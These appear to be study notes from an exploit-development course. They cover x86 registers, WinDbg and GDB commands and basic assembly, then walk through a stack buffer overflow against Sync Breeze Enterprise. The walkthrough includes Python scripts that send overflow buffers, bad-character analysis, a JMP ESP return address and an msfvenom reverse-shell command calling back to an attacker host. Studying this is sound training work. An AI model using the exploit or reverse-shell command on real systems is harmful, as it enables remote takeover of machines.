# WinDbg and x86 Architecture

```bash
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /size:1900x880 /u:Offsec /p:lab /v:192.168.181.10 /drive:EXP-301,/home/kali/OffSec/EXP-301

rdesktop -a 16 -z -r sound:remote -x b -D -x m -g 1900x900 -u Offsec -p lab 192.168.167.10
```

## x86 Architecture

Process memory is allocated in Windows between the memory address 0x00000000 and 0x7FFFFFFF.

|            |       |
| ---------- | ----- |
| 0x00000000 |       |
|            | Stack |
| 0x00400000 | Program Image |
|            | Process Environment Block (PEB) |
|            | Thread Environment Block (TEB) |
|            | Heap |
|            |      |
|            | Dynamic Link Library (DLL) |
| 0x7FFDF000 |                            |
| 0x7FFFFFFF | Kernel Memory Space |
| 0xFFFFFFFF |                     |

When a thread is running, it executes code from within the **Program Image** or from various **DLLs**.

Each thread in a running application has its own **stack** which is a short-term data area for functions, local variables, and program control information.

Last-In, First-Out: While accessing the stack, items put ("pushed") on the top of the stack are removed ("popped") first.

The x86 architecture implements dedicated **PUSH** and **POP** assembly instructions to add or remove data to the stack respectively.

Multiple **calling conventions** (The Windows x86 API makes use of the **__stdcall** calling convention)

- How the parameters and return value are passed (placed in CPU registers, pushed on the stack, or both), in which order they are passed

- How the stack is prepared and cleaned up before and after the call, and what CPU registers the called function must preserve for the caller.

When a function ends, the **return address** is taken from the stack and used to restore the execution flow to the calling function.

The "return address" (+ function's parameters and local variables) is associated with one function call and is stored in a **stack frame**.

| Thread Stack Frame Example |
| -------------------------- |
| Function A return address:    0x00401024 |
| Parameter 1 for function A:   0x00000040 |
| Parameter 2 for function A:   0x00001000 |
| Parameter 3 for function A:   0xFFFFFFFF |

| 32-bit register | Lower 16 bits | Higher 8 bits | Lower 8 bits |
| --------------- | ------------- | ------------- | ------------ |
| EAX             | AX            | AH            | AL           |
| EBX             | BX            | BH            | AL           |
| ECX             | CX            | CH            | AL           |
| EDX             | DX            | DH            | AL           |
| ESI             | SI            | N/A           | N/A          |
| EDI             | DI            | N/A           | N/A          |
| EBP             | BP            | N/A           | N/A          |
| ESP             | SP            | N/A           | N/A          |
| EIP             | IP            | N/A           | N/A          |

General purpose registers:
- EAX (accumulator): Arithmetical and logical instructions
- EBX (base): Base pointer for memory addresses
- ECX (counter): Loop, shift, and rotation counter
- EDX (data): I/O port addressing, multiplication, and division
- ESI (source index): Pointer addressing of data and source in string copy operations
- EDI (destination index): Pointer addressing of data and destination in string copy operations

The stack is **dynamic** and changes constantly during program execution.

The stack pointer **ESP** keeps "track" of the most recently referenced location on the stack (top of the stack) by storing a pointer to it.

A pointer is a reference to an address (or location) in memory.

A register "stores a pointer" or "points" to an address:
=> The register is storing that target address

For a function to locate its stack frame, which stores the required arguments, local variables, and the return address.

=> The base pointer **EBP** stores a pointer to the top of the stack when a function is called. By accessing EBP, a function can easily reference information from its stack frame (via **offsets**) while executing.

EIP, the instruction pointer, always points to the next code instruction to be executed.

## WinDbg

`Attach to a Process...` (F6 key)

The debugger injects a software breakpoint by overwriting the current instruction in memory with an `INT 3` assembly instruction.

Note: If we do not enter a 'g' (Go) at the command window prompt, the application will stay suspended.

**Disassembly** view shows the next instructions to be executed by the CPU.

**Command** window will allow us to interact with WinDbg and use more advanced features such as the built-in scripting language.

Customized WinDbg to roughly mimic the layout of the **Immunity Debugger**

| Left        | Right     |
| ----------- | --------- |
| Disassembly | Registers |
| Memory      | Memory    |
| Command     |           |

End the current debugging session in 2 ways:

1. Selecting `Debug > Detach Debugee`, which leaves the application running.

2. Selecting `Debug > Stop Debugging` or with the `Shift + F5` keyboard shortcut, which closes the application.

The command `.hh` , and refer to the cheat sheet `http://windbg.info/doc/1-common-cmds.html` for a quick review.

### Debugging Symbols

**Symbol files** permit WinDbg to reference internal functions, structures, and global variables using names instead of addresses.

Configuring the symbols path allows WinDbg to fetch symbol files for **native Windows executables and libraries** from the official Microsoft symbol store.

The symbols files (with extension `.PDB`) are created when the native Windows files are compiled by Microsoft.

`https://msdl.microsoft.com/download/symbols`

Microsoft does not provide symbol files for all library files, and 3rd party applications may have their own symbol files.

Set up the debugging environment:
- Access the symbol settings through the `File > Symbol File Path...` menu. A commonly used symbol path is `C:\symbols`.

Force the download of available symbols for all loaded modules before debugging

`.reload /f`

Inspect the assembly code of certain Windows APIs + any part of the code of the current running program.

The `u` command accepts either a single **memory address** or a **range of memory** as an argument, i.e. where to start disassembling from.

If we do not specify this argument, the disassembly will begin at the memory address stored in **EIP**.

Select `Break` from the `Debug` menu to halt execution.

Provide a **function symbol** or a memory address

```
u kernel32!GetCurrentThread
u myapp!main L3
u 00a01020
u @eip
```

`ub` command is a variation on the unassemble command that disassembles instructions prior to the supplied address.

`ub 00c0299b L1`

### Reading from Memory

| Size indicator        | Example               |   
| --------------------- | --------------------- |
| byte                  | db kernel32!WriteFile |
| words (two bytes)     | dw @esp               |
| DWORDs (four bytes)   | dd @esp               |
| QWORDs (eight bytes)  | dq 00faf974           |


Display ASCII characters in memory + WORDs or DWORDs

```
dW KERNELBASE+0x40
dc KERNELBASE
```

The default length when displaying data is **0x80** bytes.

- `dW L2` command outputs 2 WORDS
- `db L2` outputs 2 bytes.

```
db memory!ugreeting L1a
dW KERNELBASE L2
dd @esp L10
```

Display the memory content at a specified address as

- ASCII format using the `da` command
- Unicode format using the `du` command.

```
da @esp
da memory!greeting
da 00b4c0a8
du @edi
```

Display data referenced from a memory address. (same as using `dd`  twice to emulate a memory dereference)

```
dd poi(esp)
da poi(memory!ptr)
```

```
dd @esp L1
dd 771bab89
```

### Dumping Structures from Memory

The `dt` command takes the **name of the structure** to display as an argument and, optionally, a **memory address** from which to dump the structure data.

Each specified field for that structure is shown at the relative specific **offset** into the structure, field name and its data type**.

For cases where a field points to a **nested structure**, the field data type is replaced by the correct **sub-structure type**.

- The sub-structure type can also be identified with an **underscore** (_) leading the field type

- The field type name in **capital letters**.

The structure needs to be provided by one of the loaded **symbol files**.

Supply the `-r` flag to the `dt` command to recursively **display nested structures** where present.

The **$teb** pseudo register == address of the Thread Environment Block (TEB)

Display specific fields in the structure by passing the **name of the field** as an additional parameter.

```
dt memory!_HACKER
dt -r memory!_HACKER
dt -r1 memory!_HACKER
dt memory!_HACKER handle
dt memory!_HACKER handle id
dt memory!_HACKER biography.age
dt memory!_HACKER 00b4de40
dt -r memory!_HACKER 00b4de40 biography.profile.favfood

dt ntdll!_TEB
dt -r ntdll!_TEB @$teb
dt ntdll!_TEB @$teb ThreadLocalStoragePointer
```

Display the **size of a structure** extracted from a symbol file

`?? sizeof(ntdll!_TEB)`

### Writing to Memory

```
ed esp 41414141
eb memory!integer 41 42 43 44
```

`ea` and `eu` do not null terminate strings.

=> `eza` and `ezu` commands for ASCII and Unicode strings, respectively

```
ea esp "Hello"
ea memory!greeting "Goodbye!"
eu memory!ugreeting "Farewell!"

eza memory!greeting "Goodbye!"
```

### Searching the Memory Space

4 additional parameters to perform a search:

1. The memory type to search for (`-d` for DWORD)
2. The starting point of memory to search (0)
3. The length of memory to search (to search the whole memory range, enter "L?80000000")
4. The pattern to search for (41414141)

```
s -b 0 L?80000000 48 65 6c 6c 6f
s -d 0 L?80000000 41414141
s -a 0 L?80000000 "This program cannot be run in DOS mode"
s -a 0xb80000 L1000 "I'm an egg"
s -u 0 L?80000000 w00tw00t
```

### Inspecting and Editing CPU Registers in WinDbg

```
r

r ecx
r zf

r ecx=41414141
r zf = 0
```

### Controlling the Program Execution in WinDbg

2 different types of breakpoints; software and processor/hardware breakpoints.

#### Software Breakpoints

Use the `bl` command to list all the breakpoints.

Let the execution continue by issuing the `g` command.

Disable and enable breakpoints using the `bd` (disable) and `be` (enable) commands.

Clear breakpoints using the `bc` command

```
bl
bd 0
be 0
bc 0
bc *
```

Set a breakpoint that will halt the execution flow of the application when changes are being saved to a file.

```
bp kernel32!WriteFile
bp flow!breakme
bp 00c01020
g
```

Use the `bu` command to set a breakpoint on an unresolved function. This is a function residing in a module that isn't yet loaded in the process memory space.

The breakpoint will be enabled when the module is loaded and the target function is resolved.

```
lm m ole32
bu ole32!WriteStringStream
g
```

While the breakpoint is resolved when `ole32.dll` is loaded, it is not triggered. Because our actions did not force a call to ole32!WriteStringStream

Execute the `.printf` command every time the breakpoint set on the kernel32!WriteFile API is triggered - Display the number of bytes to write to the target file (3rd argument)

```
bp kernel32!WriteFile ".printf \"The number of bytes written is: %p\", poi(esp + 0x0C);.echo;g"

bp flow!doubl ".printf \"The value of the argument: %x\", poi(esp+4); .echo"

bp flow!doubl ".printf \"The contents of the global variable: %ma\", flow!data; .echo"

bp flow!doubl ".if (poi(esp+4) > 0x20) {.printf \"The value of the argument: %x\", poi(esp+4); .echo} .else {gc}"
```

`.printf` supports the use of format strings such as `%p`, which will display the given value as a pointer.

The `.echo` command displays the output of .printf to the WinDbg command window.

The WriteFile prototype:

```c
BOOL WriteFile(
  HANDLE       hFile,
  LPCVOID      lpBuffer,
  DWORD        nNumberOfBytesToWrite,
  LPDWORD      lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
);
```

Windows x86 API: Function arguments are pushed on the stack in reverse order (right to left). In this case, each argument occupies **4 bytes** of memory on the stack.

Halt the execution flow only if we write exactly 4 bytes of data to a file from Notepad

```
bp /w "@eax == 5" 00c010e7

bp kernel32!WriteFile ".if (poi(esp + 0x0C) != 4) {gc} .else {.printf \"The number of bytes written is 4\";.echo;}"
```

When our breakpoint on WriteFile is triggered, use `gc` (go from conditional breakpoint) to resume execution, unless the nNumberOfBytesToWrite argument (3rd argument on the stack) is equal to "4".

#### Hardware Breakpoints

Hardware or processor breakpoints are handled by the processor and stored in the processor's debug registers.

They can stop code execution when a particular type of access, such as read, write, or execute, is made to a targeted memory location.

=> Provide the ability to monitor changes or access to data in memory.

However, the x86 and x64 architectures only use 4 debug registers, so unlike software breakpoints, we are **limited by the number of processor breakpoints**.

Hardware breakpoints must be set after the entry point has been reached and a simple way of doing this is by attaching to a running process.

3 arguments to the `ba` command.
1. The type of access, which can be either e (execute), r (read), or w (write).
2. The size in bytes for the specified memory access
3. The memory address where we want to set the breakpoint at.

```
ba e 1 kernel32!WriteFile
ba r 1 flow!data
ba w 2 03b2c768
g
```

### Stepping Through the Code

The `p` command will execute one single instruction at a time and steps over function calls, and `t` will do the same, but will also step into function calls.

`pt` (step to next return) allows us to fast-forward to the end of a function.

`ph` executes code until a branching instruction is reached. This includes conditional or unconditional branches, function calls, and return instructions.

```
p
p 2
t

pt
tt

ph
th
```

`pa` allow us to execute until a specific instance of a particular command + gives us a step-by-step account of the state of execution.

```
pa 00d0105d
```

### Listing Modules and Symbols in WinDbg

Display all loaded modules, including their starting and ending addresses in virtual memory space:

The `lm` command can also filter modules by accepting the wildcard (*) character:

```
lm
lm m kernel*
```

Dump symbols present from the KERNELBASE module.

```
x kernelbase!CreateProc*
x *!strcpy
x features!???cpy
```

### Using WinDbg as a Calculator

Find the difference between 2 addresses or finding lower or upper byte values of a DWORD

```
? @eip + 24
? 77269bc0  - 77231430
? 77269bc0 >> 18
? 0x12345678 & 0xffff
```

```
? features!buf1 - features!buf2
```

Convert the hex number 41414141 to decimal, then convert the decimal number 0n41414141 to hexadecimal, and finally convert the binary 0y1110100110111 to decimal and hexadecimal.

```
? 41414141
? 0x20
? 0n41414141
? - 0n254
? 0y1110100110111
```

The `.formats` command is also useful for converting between different formats at once, including the ASCII representation of the value

```
.formats 41414141
.formats @esp
.formats 0x12345678 & 0xffff
```

### Pseudo Registers

20 user-defined pseudo registers named $t0 to $t19 can be used as variables during mathematical calculations.

**When using pseudo registers as well as regular registers, it is recommended to prefix them with the "@" character.**

It speeds up the evaluation process because WinDbg will not try to resolve it as a symbol first.

```
? ((41414141 - 414141) * 0n10) >> 8
```

Performed with a pseudo register

```
r @$t0 = (41414141 - 414141) * 0n10
? @$t0 >> 8
```

### WinDbg Extensions

Use `!address` to find out more about the address in the eip register.

The address in eip belongs to the image, which contains the binary instructions, something that is indicated by the "Usage: Image" field.

Other useful information includes the base address and end address of the memory region and its size. + information related to its type, protections, and state.

Contrast this with a stack address:

In this Listing, the same fields are provided, but the address, unsurprisingly, belongs to a different memory region and as a result the fields have different values. Note, in particular, that protections have changed. Although the image is executable, the stack, in this case, is not.

- The `!address` extension command provides information about the **memory range** within which an address falls, which includes it's protections,

- The `!vprot` command provides information about the **specific address**. This is significant because the protections of the page to which the address belongs may have been altered at some point after the memory is allocated.

The `!teb` and `!peb` commands provide us with information about the contents of the TEB (Thread Environment Block) and PEB (Process Environment Block) structures, respectively.

```
!address @eip
!address @esp

!vprot @esp
```

### WinDbg Scripting

`$><C:\windbg_lu\lu5\script.wds`

```nasm
bp features!func
r $t0 = 0
.for (r $t1 = 0; @$t1 < a; r $t1 = @$t1 + 1) 
{
    g
    r $t0 = @$t0 + poi(@esp + 4)
    .printf "Argument: 0x%x (%c)\n", poi(@esp + 4), poi(@esp + 4)
}
.printf "Sum of arguments: 0x%x", @$t0
```

Shorter version using breakpoint-based actions

```nasm
r $t0 = 0
r $t1 = 0
bp features!func "r $t0 = @$t0 + poi(@esp + 4); .printf \"Argument: 0x%x (%c)\\n\", poi(@esp + 4), poi(@esp + 4); r $t1 = @$t1 + 1; .if (@$t1 == 0xa) {.printf \"Sum of arguments: 0x%x\", @$t0}; g"
g
```

# x86-64 (Intel) Assembly

Instructions for **unsigned** number comparisons

| Instruction |          Name                              |
|-------------|--------------------------------------------|
| JE/JZ       | Jump if Equal or Jump if Zero              |
| JNE/JNZ     | Jump if not Equal / Jump if Not Zero       |
| JA/JNBE     | Jump if Above / Jump if Not Below or Equal |
| JAE/JNB     | Jump if Above or Equal / Jump if Not Below |
| JB/JNAE     | Jump if Below / Jump if Not Above or Equal |
| JBE/JNA     | Jump if Below or Equal / Jump if Not Above |

Instructions for **signed** number comparisons

| Instruction |          Name                               |
|-------------|---------------------------------------------|
| JE/JZ       | Jump if Equal or Jump if Zero               |
| JNE/JNZ     | Jump if not Equal / Jump if Not Zero        |
| JG/JNLE     | Jump if Greater / Jump if Not Less or Equal |
| JGE/JNL     | Jump if Greater / Equal or Jump Not Less    |
| JL/JNGE     | Jump if Less / Jump if Not Greater or Equal |
| JLE/JNG     | Jump if Less or Equal / Jump Not Greater    |

## While loop

```c
i = 3;
j = 10;
while (i <> 0)
{
  j++;
  i--;
}
```

```nasm
init_loop:
  MOV ECX, 3
  MOV EAX, 10

loop:
  TEST ECX, ECX
  JZ continue_here
  INC EAX
  DEC ECX
  JMP loop
  
continue_here:
...
```

## If-Else

```c
i = 3;
if (i > 4):
  i = i + 5;
else if (i < 3):
  i = i + 6;
else if (i == 3):
  i++;
i = 4;
```

```nasm
init:
  MOV EAX, 3

branching:
  CMP EAX, 4
  JA add_5
  CMP EAX, 3
  JB add_6
  JE add_1
  JMP end
  
add_5:
  ADD EAX, 5
  JMP end
add_6:
  ADD EAX, 6
  JMP end
add_1:
  INC EAX
  JMP end
  
end:
  MOV EAX, 4
```

```bash
nasm -f elf32 test.asm
ld -m elf_i386 test.o -o test
./test
```

## Hello World in 64-bit Assembly

`hello.asm`

```nasm
global _start

section .text

_start:
  ; write system call
  MOV RDI, 1                ; standard output
  MOV RSI, hello_text       ; address of "Hello world!"
  MOV RDX, hello_text_len   ; length of "Hello world!"
  MOV RAX, 1                ; write syscall number
  SYSCALL

  ; exit system call
  MOV RDI, 0                ; success
  MOV RAX, 60               ; exit syscall number
  SYSCALL

section .data
  hello_text db "Hello world!", 0
  hello_text_len equ $ - hello_text
```

```bash
nasm -f elf64 hello.asm
ld hello.o -o hello
./hello
```

## GDB commands

```bash
gdb test
```

Set the debugger to use the Intel assembly syntax instead of AT&T, which is the default

Disassemble the code with the /r option to also show the **opcodes**

```
break _start
break *0x00401015

delete 2

run
stepi
c

set disassembly-flavor intel

disassemble
disassemble /r
disassemble 0x8049000

info registers
info registers eip

x/4b 0x08049000
x/64xw $esp
x/s 0x402000
```

# Exploiting Stack Overflows

Data Execution Prevention (DEP) helps prevent code execution from data pages by raising an exception when attempts are made to do so.

Address Space Layout Randomization (ASLR) randomizes the base addresses of loaded applications and DLLs every time the OS is booted.

On older Windows OS, like Windows XP where ASLR is not implemented, all DLLs are loaded at the same memory address every time, which makes exploitation easier.

DEP + ASLR provides a very strong mitigation against exploitation.

Control Flow Guard (CFG) is Microsoft's implementation of control-flow integrity.

It performs validation of **indirect code branching** such as a **call instruction that uses a register** as an operand **rather than a memory address** such as CALL EAX.

=> Prevent the overwrite of function pointers in exploits.

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buffer[64];

	if (argc < 2)
	{
		printf("Error - You must supply at least one argument\n");
		return 1;
	}
	
	strcpy(buffer, argv[1]);
	
  return 0;
}
```

| Before StrCpy | Copy with 32 A's | Copy with 80 A's |
| ------------- | ---------------- | ---------------- |
| StrCpy destination address | StrCpy destination address | StrCpy destination address |
| StrCpy source address | StrCpy source address | StrCpy source address |
| Reserved char buffer memory | AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | Reserved char buffer memory | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | Reserved char buffer memory | AAAAAAAAAAAAAAAA |
| Return address of main | Return address of main | AAAA |
| Main parameter 1 | Main parameter 1 | AAAA |
| Main parameter 2 | Main parameter 2 | AAAA |

The CPU will try to read the next instruction from `0x41414141` (hexadecimal value of `AAAA`).

Since this is not a valid address in the process memory space, the CPU will trigger an access violation, crashing the application.

## Controlling EIP

`python stack_overflow_0x01.py 192.168.120.10`

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"A" * size
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
 
  print("Done!")

except socket.error:
  print("Could not connect!")
```

The EIP register is overwritten by four `0x41` bytes, which are part of our `username` string, the 800-byte "A" buffer.

Which part of our buffer is landing in EIP?

1. Attempt a binary tree analysis: Instead of 800 A's, send 400 A's and 400 B's.

- If EIP is overwritten by B's => The 4 bytes are in the 2nd half of the buffer.
- Then change the 400 B's to 200 B's and 200 C's, and send the buffer again.
- Continue splitting the specific buffer until we reach the exact 4 bytes that overwrite EIP.

2. Insert a long string made of non-repeating 4-byte chunks as our input > when the EIP is overwritten with 4 bytes from our string, use that unique sequence to pinpoint the exact location. 

Generate a non-repeating string:

```bash
locate pattern_create
msf-pattern_create -h

msf-pattern_create -l 800
```

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  #inputBuffer = b"A" * size
  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The EIP register has been overwritten with `42306142` (hexadecimal value of `B0aB`). 

```bash
msf-pattern_offset -l 800 -q 42306142
```

`[*] Exact match at offset 780`

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  filler = b"A" * 780
  eip = b"B" * 4
  buf = b"C" * 16
  inputBuffer = filler + eip + buf
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The EIP now contains our 4 B's (`0x42424242`)

## Locating Space for Our Shellcode

```
r
dds esp L3
dds esp -10 L8
```

The first 4 C's from our buffer landed at address `0x00567458`.

ESP == `0x0056745c`, which points to the next 4 C's from our buffer.

A standard reverse shell payload requires ~350-400 bytes of space.

=> Try increasing the buffer length from 800 bytes to 1500 bytes.

In some cases, increasing the length of a buffer may result in a completely different crash since the larger buffer **overwrites additional data on the stack** that is used by the target application.

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"
...
```

```
dds esp - 8 L7
dds esp+2c0 L4
```

`? 00567724 - 0056745c`

Evaluate expression: 712 = 000002c48

=> 712 bytes of free space for our shellcode.

## Checking for Bad Characters

Depending on the application, vulnerability type, and protocols in use, there may be certain bad characters that should not be used in our **buffer, return address, or shellcode**.

A bad character prevents or changes the nature of our crash. Or  they end up mangled in memory.

E.g., The null byte (`0x00`) is used to terminate a string in low-level languages such as C/C++. This causes the string copy operation to end, effectively truncating our buffer at the first instance of a null byte. 

Because we are sending the exploit as part of an HTTP POST request, avoid the return character `0x0D`, which signifies the end of an HTTP field (the `username` in this case).

**Send all possible characters** - from `0x00` to `0xFF` - as part of our buffer

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
  inputBuffer = filler + eip + offset + badchars
  content = b"username=" + inputBuffer + b"&password=A"
...
```

`db esp - 10 L20`

`0x0A` character translates to a **line feed**, which terminates an HTTP field, similar to a **carriage return**.

Repeat these steps until we have verified every character.

=> `0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, 0x3D` will mangle our input buffer while attempting to overflow the destination buffer.

## Finding a Return Address

Find a reliable static address that contains a `JMP ESP` instruction.

Redirect EIP to this address, the `JMP ESP` instruction will be executed and direct the execution flow into our shellcode.

Many support libraries in Windows contain this commonly-used instruction, 2 important criteria:

1. The address used in the library must be static, which eliminates the libraries compiled with **ASLR** support.

2. The address of the instruction must not contain any of the **bad characters** that would break the exploit, since the address will be part of our input buffer.

To determine the protections of a particular module, check the `DllCharacteristics` member of the `IMAGE_OPTIONAL_HEADER` structure, which is part of the `IMAGE_NT_HEADERS` structure.

The `IMAGE_NT_HEADERS` structure can be found in the **PE header** of the target module.

The Portable Executable (PE) format starts with the **MS DOS header**, which contains an offset to the start of the **PE header** at offset `0x3C`.

Find the protections of the `syncbrs.exe` executable

Get the base address of the module

`lm m syncbrs`

Dump the `IMAGE_DOS_HEADER5`

`dt ntdll!_IMAGE_DOS_HEADER 0x00400000`

At offset `0x3C`, the `e_lfanew` field contains the offset to our PE header (`0xE8`) from the base address of `syncbrs.exe`

`? 0n232`

Evaluate expression: 232 = 000000e8

`dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8`

At offset `0x18` we have the `IMAGE_OPTIONAL_HEADER` structure we need that contains the `DllCharacteristics` field.

`dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18`

The current value of `DllCharacteristics` is `0x00`.

=> `syncbrs.exe` does not have any protections enabled such as **SafeSEH** (Structured Exception Handler Overwrite), an exploit-preventative memory protection technique, **ASLR**, or **NXCompat** (DEP protection).

The `ImageBase` member being set to `0x400000` => the preferred load address for `syncbrs.exe` is `0x00400000`. 

=> All instructions' addresses (`0x004XXXXX`) will contain at least one null character => unsuitable for our input buffer.

**Process Hacker** tool detects mitigations, such as DEP and ASLR,and more modern mitigations such as ACG and CFG.

Launch **Process Hacker** > Double click the `syncbrs.exe` executable >  Under the **General** tab, find the **Mitigation Policies** field, which is currently set to "None" > Clicking on **Details** also shows no mitigations in place.

Browsing to the **Module** tab provides us with all the **DLLs** that are loaded in the process memory > To inspect the `DllCharacteristics`, double click on a module and open the properties window.

**Advanced tip**: If this application was compiled with **DEP** support, our `JMP ESP` address would need to be located in the `.text` code segment of the module. This is the only segment with both read (R) and executable (E) permissions.

Searching through all the modules, we discover that `LIBSSP.DLL` suits our needs and the **address range** doesn't seem to contain bad characters.

Since DEP is not enabled in this case, we can use instructions from any address in this module.

```bash
msf-nasm_shell
nasm > jmp esp
```
00000000  FFE4              jmp esp

`lm m libspp`

`10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll`

`s -b 10000000 10223000 0xff 0xe4`

One address containing a `JMP ESP` instruction (`0x10090c83`), which fortunately does not contain any of our bad characters.

`u 10090c83`

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  shellcode = "D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The `JMP ESP` address is written in reverse order;

**Little endian** is used by the x86 and AMD64 architectures - the low-order byte of the number is stored in memory at the lowest address, and the high-order byte at the highest address.

```
bp 10090c83
g
t
dc eip 4
```

## Generating Shellcode with Metasploit

```bash
msfvenom -l payloads

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Replace regex `"\n"` with blank in VS Code

## Getting a Shell

Because of the encoding, the shellcode is prepended by a **decoder stub**.

During the process of gathering the decoder stub's location in memory, the code performs a sequence of assembly instructions commonly referred to as a **GetPC** routine.

This routine moves the value of the EIP register into another register.

As with other GetPC routines, those used by `shikata_ga_nai` have an unfortunate side-effect of writing data at and around the top of the stack.

This eventually mangles several bytes close to the address pointed at by the ESP register.
